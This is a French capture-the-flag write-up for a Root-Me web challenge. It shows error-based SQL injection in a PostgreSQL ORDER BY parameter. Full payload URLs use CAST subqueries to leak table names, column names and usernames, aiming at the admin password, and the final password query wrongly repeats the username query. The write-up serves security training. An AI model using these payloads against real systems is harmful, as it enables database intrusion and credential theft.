<img width="1169" height="218" alt="image" src="https://github.com/user-attachments/assets/60b1dbae-f42f-4116-b35d-bb976b12df27" />

On voit dans l'url des parametres, typique de sql:

```
order=ASC → tri croissant
order=DESC → tri décroissant
```

Sauf que quand on a ca:cette forme marche également

`ORDER BY page ASC, TON_INPUT `

order=ASC, 1 ca marche mais si tu met un strig ca marche pas

Notamment si je met ca: `order=ASC, (SELECT table_name FROM information_schema.tables LIMIT 1)` , ca va rien m'afficher

Par contre si je met: CAST(), il y aura l'erreur mais ca va m'afficher la valeur de l'erreur

CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)

Donc je peux mettre order=ASC,CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int), et ca va me ressortir la valeur de la table

<img width="1617" height="226" alt="image" src="https://github.com/user-attachments/assets/e256899a-5101-4b19-b5aa-51f5acfa7c75" />

On voit qu'on a une table nommée`"m3mbr35t4bl3"


Ensuite avec cette table, on arrive à recuperer le nom des colonnes:

`http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,(CAST((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=$$m3mbr35t4bl3$$%20LIMIT%201)%20AS%20int))`

La structure du payload, est quasi similaire, juste on viens prendre dans information_shema.columns, et pour citer une table dans postegre, c est $$nomdelatable$$

On obtient la valeur `id`

<img width="1617" height="226" alt="image" src="https://github.com/user-attachments/assets/e6654987-49b8-4df7-96ea-e6b23ce0ac7b" />

Ducoup on continue de ce balader dans la table voir, les differentes colonnes:

On utilise `OFFSET`

`http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,(CAST((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=$$m3mbr35t4bl3$$%20LIMIT%201%20OFFSET%201)%20AS%20int))`

En utilisant =1, =2, =3 ect...

On trouve: "us3rn4m3_c0l"; "p455w0rd_c0l"; "em41l_c0l"; 

Donc mtn on va essayer d'afficher le nom des users, pour trouver un potentiel ADMIN

`&order=ASC,(CAST((SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1) AS int))`

On trouve bien un admin, donc on cherche le mdp avec cette commande

`&order=ASC,(CAST((SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1) AS int))
`

<img width="1617" height="226" alt="image" src="https://github.com/user-attachments/assets/3651df76-a69c-480f-bbde-2ad31ca305bc" />

Quand on rentre les logs on trouve:

<img width="317" height="227" alt="image" src="https://github.com/user-attachments/assets/e9286719-8c85-4e1b-a77d-35328ffc2e09" />










